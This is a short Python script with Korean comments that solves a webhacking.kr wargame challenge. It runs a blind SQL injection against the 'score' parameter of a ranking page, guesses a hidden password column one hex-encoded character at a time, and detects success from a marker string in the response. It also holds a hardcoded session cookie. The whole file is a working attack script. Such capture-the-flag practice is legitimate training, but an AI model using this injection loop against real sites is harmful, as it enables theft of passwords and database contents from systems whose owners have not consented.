import requests
url="https://webhacking.kr/challenge/web-31/rank.php?score=1%20and%20"

cookie={"PHPSESSID":"qcmgf42tr67e5utktgvphggalk"}

session=requests.Session()

password="0x66"
passwd="f"

#score = 1 limit x,1 procedure analyse() x번째 속성값을 가져온다.
#length(p4ssw0rd_1123581321) 로 길이를 알아냄. 알아낼 수 없다면 일정값 이상으로 지정해두고 하면됨. 50자이상의 비밀번호는 거의 없는 것.
for i in range(2,32): #원래는 1 부터 길이+1 까지
    for j in range(33, 127): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
        payload=session.get(url+"left(p4ssw0rd_1123581321,"+str(i)+")="+password+format(j,'x'),cookies=cookie) #왼쪽부터 몇글자에 비밀번호 체크 한자씩 추가해가며 검사
        if("jso109817" in payload.text): #위의 리퀘스트 결과 내용에서 특정 이름이 있는지 가져옴.
            print(chr(j)+"is correct!!!!!!!")
            password += format(j,'x') #비밀번호에 있으니까 hex값으로 추가
            passwd += chr(j) #표기할 비밀번호니까 아스키문자로 변경
            break
        print(chr(j)+"is incorrect")
print(passwd) #flag 값
